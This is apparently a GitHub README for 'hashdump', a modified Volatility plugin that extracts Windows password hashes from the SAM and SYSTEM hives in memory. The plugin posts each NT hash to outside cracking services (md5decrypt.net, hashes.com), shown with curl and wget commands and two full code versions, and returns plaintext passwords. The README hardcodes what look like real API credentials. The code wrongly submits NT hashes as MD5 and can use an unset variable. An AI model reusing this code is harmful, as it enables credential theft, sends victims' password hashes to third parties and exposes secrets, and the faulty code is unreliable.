# hashdump
A Python-based tool for interacting with the Hashes.com API to decrypt hash values. This utility is designed for cybersecurity professionals, ethical hackers, and anyone interested in hash decryption. It simplifies sending hash values and retrieving their plaintext counterparts using the MD5 algorithm by integrating it with a third-party web application. 

Free API: md5decrypt.net

The first integration involves a free API provided by md5decrypt.net, a widely recognized platform for its efficiency in decrypting md5 hash type. This integration primarily serves users requiring basic hash decryption services without incurring costs. It demonstrates a commitment to providing accessible solutions while maintaining quality and efficiency.

Pseudo Code:
The _generator function takes two arguments: syshive (System Hive) and samhive (SAM Hive).
It checks the validity of these hives and retrieves necessary keys (bootkey and hbootkey).
For each user in the SAM hive, it retrieves their LM and NT hashes.
These hashes are converted into hexadecimal format.
The NT hash (ntout) is used to construct an API URL.
A GET request is sent to this URL, and the response, which presumably contains the cracked password, is stored in cracked_password.
The function then yields a tuple containing user details, including the cracked password.
The run function sets up the hives and calls _generator, organizing the returned data into a structured format for presentation or further processing.

Sending API request using curl:

``` curl -w '\n' "https://md5decrypt.net/en/Api/api.php?hash=5f4dcc3b5aa765d61d8327deb882cf99&hash_type=md5&email=rpanakadan2022@my.fit.edu&code=73c74dfc79d2bdb6" ```

![image](https://github.com/Rusheelraj/hashdump/assets/30828807/f892d7ef-80be-4342-87b3-eaeace94d054)

Sending API request using wget:

``` wget -qO- "https://md5decrypt.net/en/Api/api.php?hash=5f4dcc3b5aa765d61d8327deb882cf99&hash_type=md5&email=rpanakadan2022@my.fit.edu&code=73c74dfc79d2bdb6"; echo ```

![image](https://github.com/Rusheelraj/hashdump/assets/30828807/38a75f93-9621-4267-b31c-4bb86a48fca1)

In both cases, the hash "5f4dcc3b5aa765d61d8327deb882cf99" is decrypted into "password".

Changes in the hashdump plugin:

```
    def _generator(
        self, syshive: registry.RegistryHive, samhive: registry.RegistryHive
    ):
        if syshive is None:
            vollog.debug("SYSTEM address is None: No system hive found")
        if samhive is None:
            vollog.debug("SAM address is None: No SAM hive found")
        bootkey = self.get_bootkey(syshive)
        hbootkey = self.get_hbootkey(samhive, bootkey)
        if hbootkey:
            for user in self.get_user_keys(samhive):
                ret = self.get_user_hashes(user, samhive, hbootkey)
                if ret:
                    lmhash, nthash = ret

                    ## temporary fix to prevent UnicodeDecodeError backtraces
                    ## however this can cause truncated user names as a result
                    name = self.get_user_name(user, samhive)
                    if name is None:
                        name = renderers.NotAvailableValue()
                    else:
                        name = str(name, "utf-16-le", errors="ignore")

                    lmout = str(binascii.hexlify(lmhash or self.empty_lm), "latin-1")
                    ntout = str(binascii.hexlify(nthash or self.empty_nt), "latin-1")
                    rid = int(str(user.get_name()), 16)
                    api_url = f"https://md5decrypt.net/en/Api/api.php?hash={ntout}&hash_type=md5&email=rpanakadan2022@my.fit.edu&code=73c74dfc79d2bdb6"
                    response = requests.get(api_url)
                    cracked_password = response.text.strip()
                    yield (0, (name, rid, lmout, ntout, cracked_password))
        else:
            vollog.warning("Hbootkey is not valid")

    def run(self):
        offset = self.config.get("offset", None)
        syshive = None
        samhive = None
        kernel = self.context.modules[self.config["kernel"]]
        for hive in hivelist.HiveList.list_hives(
            self.context,
            self.config_path,
            kernel.layer_name,
            kernel.symbol_table_name,
            hive_offsets=None if offset is None else [offset],
        ):
            if hive.get_name().split("\\")[-1].upper() == "SYSTEM":
                syshive = hive
            if hive.get_name().split("\\")[-1].upper() == "SAM":
                samhive = hive

        return renderers.TreeGrid(
            [("User", str), ("rid", int), ("lmhash", str), ("nthash", str), ("cracked_password", str)],
            self._generator(syshive, samhive),
        )

```

Paid API: hashes.com

The second aspect of our integration encompasses a more advanced, paid service via the hashes.com API. This API operates on a credit-based system, offering more decryption algorithms and higher processing capabilities. It's tailored for more complex and demanding decryption tasks, making it an ideal choice for professional environments where precision and a wide array of functionalities are paramount.

Pseudo Code:
The _generator function takes two arguments: syshive (System Hive) and samhive (SAM Hive).
It checks the validity of these hives and retrieves necessary keys (bootkey and hbootkey).
For each user in the SAM hive, it retrieves their LM and NT hashes.
These hashes are converted into hexadecimal format.
The NT hash (ntout) is used to construct a payload for a POST request to the hashes.com API.
The response is checked for a successful status code (200). If successful, the JSON response is parsed.
The plaintext password is extracted from the response if available.
The function yields user details including the decrypted plaintext password.
The run function initializes syshive and samhive, identifies the relevant hives, and calls _generator to process each user.
The results are formatted into a grid for display or further processing.

Sending API request using curl:

```
curl -X POST -H "Content-type: multipart/form-data" \
> -F 'key=471f232d3aec5eb5a79c89bed2bdd17a' \
> -F 'hashes[]=e10adc3949ba59abbe56e057f20f883e' \
> https://hashes.com/en/api/search; echo
```

![image](https://github.com/Rusheelraj/hashdump/assets/30828807/f4113967-d88b-4bf3-adb8-6f3833927b4d)

Modifying the hashdump plugin:

```
    def _generator(
        self, syshive: registry.RegistryHive, samhive: registry.RegistryHive
    ):
        if syshive is None:
            vollog.debug("SYSTEM address is None: No system hive found")
        if samhive is None:
            vollog.debug("SAM address is None: No SAM hive found")
        bootkey = self.get_bootkey(syshive)
        hbootkey = self.get_hbootkey(samhive, bootkey)
        if hbootkey:
            for user in self.get_user_keys(samhive):
                ret = self.get_user_hashes(user, samhive, hbootkey)
                if ret:
                    lmhash, nthash = ret

                    ## temporary fix to prevent UnicodeDecodeError backtraces
                    ## however this can cause truncated user names as a result
                    name = self.get_user_name(user, samhive)
                    if name is None:
                        name = renderers.NotAvailableValue()
                    else:
                        name = str(name, "utf-16-le", errors="ignore")

                    lmout = str(binascii.hexlify(lmhash or self.empty_lm), "latin-1")
                    ntout = str(binascii.hexlify(nthash or self.empty_nt), "latin-1")
                    rid = int(str(user.get_name()), 16)
                    url = 'https://hashes.com/en/api/search'
                    files = {
                         'key': (None, '471f232d3aec5eb5a79c89bed2bdd17a'),
                         'hashes[]': (None, ntout)
                    }
                    response = requests.post(url, files=files)
                    if response.status_code == 200:
                        data = response.json()
                        if data['success'] and data['count'] > 0:
                           plaintext = data['founds'][0]['plaintext']

                    yield (0, (name, rid, lmout, ntout, plaintext))
        else:
            vollog.warning("Hbootkey is not valid")

    def run(self):
        offset = self.config.get("offset", None)
        syshive = None
        samhive = None
        kernel = self.context.modules[self.config["kernel"]]
        for hive in hivelist.HiveList.list_hives(
            self.context,
            self.config_path,
            kernel.layer_name,
            kernel.symbol_table_name,
            hive_offsets=None if offset is None else [offset],
        ):
            if hive.get_name().split("\\")[-1].upper() == "SYSTEM":
                syshive = hive
            if hive.get_name().split("\\")[-1].upper() == "SAM":
                samhive = hive

        return renderers.TreeGrid(
            [("User", str), ("rid", int), ("lmhash", str), ("nthash", str), ("plaintext", str)],
            self._generator(syshive, samhive),
        )

```







